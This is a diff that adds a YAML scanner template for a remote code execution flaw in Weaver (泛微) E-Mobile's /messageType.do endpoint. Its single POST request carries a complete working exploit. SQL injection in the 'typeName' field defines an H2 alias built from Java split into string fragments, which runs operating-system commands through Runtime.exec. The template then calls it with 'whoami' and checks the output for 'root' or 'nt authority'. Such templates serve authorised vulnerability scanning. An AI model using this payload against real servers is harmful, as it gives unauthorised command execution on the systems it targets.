@@ -1,0 +1,16 @@
+name: 泛微E-Mobile-messageType-RCE
+description: >
+  代码执行
+alwaysExecute: false
+matchCount: 1
+rules:  
+  - method: POST
+    path: /messageType.do
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00    
+    body: "--00content0boundary00\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\ncreate\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"typeName\"\r\n\r\n1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagm('whoami');--\r\n--00content0boundary00--"
+    expression:
+      status: 200
+      body_any:
+        - "nt authority"
+        - "root"        
